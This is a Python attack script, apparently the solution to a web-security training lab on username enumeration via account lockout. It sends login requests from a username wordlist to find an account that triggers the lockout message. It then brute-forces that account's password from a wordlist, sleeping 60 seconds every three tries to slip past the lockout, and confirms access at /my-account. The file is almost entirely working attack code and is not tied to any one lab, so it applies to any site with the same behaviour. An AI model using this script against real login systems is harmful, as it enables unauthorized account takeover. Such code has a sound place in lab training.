import requests
import urllib3
import re
import time
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Username enumeration via account lock"
SCRIPT_START_TIME = time.time()


def read_list(files_path):
    try:
        return open(files_path, 'rt').read().splitlines()
    except:
        print(Fore.RED + "[!] Failed to open the file " + files_path)
        exit(1)


def print_progress(counter, total_counts, text):
    elapsed = int(time.time() - SCRIPT_START_TIME)
    print(Fore.WHITE + "Elapsed: " + Fore.YELLOW + str(elapsed) +
          Fore.WHITE + f" seconds || Trying ({counter+1}/{total_counts}): " + Fore.BLUE + f"{text:50}", end='\r', flush=True)


def print_finish_message():
    elapsed = int(time.time() - SCRIPT_START_TIME)
    print(Fore.WHITE + "\n[+] Finished in: " +
          Fore.YELLOW + str(elapsed) + Fore.WHITE + " seconds")


def login(session, username, password, url):
    data = {"username": username, "password": password}
    try:
        return session.post(f"{url}/login", data=data, allow_redirects=False)
    except:
        print(Fore.RED + f"\n[!] Failed to login as {username}")
        return None


def text_exist_in_response(pattern, response):
    return bool(re.search(pattern, response.text))


def try_to_find_valid_username(session, usernames_list, url):
    total_users = len(usernames_list)

    for try_number in range(4):
        print(Fore.WHITE + f"⦗*⦘ Try number: " + Fore.BLUE + str(try_number + 1) + Fore.WHITE + f" of {total_users} usernames..")

        for counter, user in enumerate(usernames_list):
            print_progress(counter, total_users, user)
            response = login(session, user, "not_important", url)

            if response and response.status_code == 200:
                if "too many incorrect login attempts" in response.text:
                    print(Fore.GREEN + f"\n🗹 Valid username identified: {user}")
                    return user

    print(Fore.RED + "⦗!⦘ No valid username was found")
    exit(1)


def brute_force_password(session, valid_user, passwords, url):
    total_passwords = len(passwords)

    for counter, password in enumerate(passwords):
        if counter % 3 == 0:
            print(Fore.WHITE + "\n⦗*⦘ Waiting 60 seconds to bypass blocking..")
            time.sleep(60)

        print_progress(counter, total_passwords, password)
        response = login(session, valid_user, password, url)

        if response and response.status_code == 302:
            session_cookie = response.cookies.get("session")
            session.cookies.set("session", session_cookie)
            print(Fore.GREEN + f"\n🗹 Valid password found: {password}")
            return password

    print(Fore.RED + "⦗!⦘ No valid password was found")
    exit(1)



def run(url, payload, proxies=None):
    url = url.rstrip('/')
    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False

    print(Fore.WHITE + "[1] Reading usernames list..")
    usernames_list = read_list("usernames.txt")
    print(Fore.GREEN + "usernames stored")

    print(Fore.WHITE + "[2] Reading password list..")
    password_list = read_list("passwords.txt")
    print(Fore.GREEN + "passwords stored")
    print(Fore.WHITE + "This is long lab, be patience")

    print(Fore.WHITE + "[3] Finding valid username")
    valid_user = try_to_find_valid_username(session, usernames_list, url)
    print(Fore.WHITE + "\nValid username: " + Fore.GREEN + valid_user)

    print(Fore.WHITE + "[4] Brute forcing password..")
    valid_password = brute_force_password(
        session, valid_user, password_list, url)

    print(Fore.WHITE + "\nValid username: " + Fore.GREEN + valid_user)
    print(Fore.WHITE + "Valid password: " + Fore.GREEN + valid_password)

    print(Fore.WHITE + "[5] Logging in.. ", end="", flush=True)

    try:
        r = session.get(f"{url}/my-account", allow_redirects=False)
        if "Your username is: " in r.text:
            print_finish_message()
            return True
        else:
            print(Fore.RED + "Login session failed.")
            return False
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")
        return False
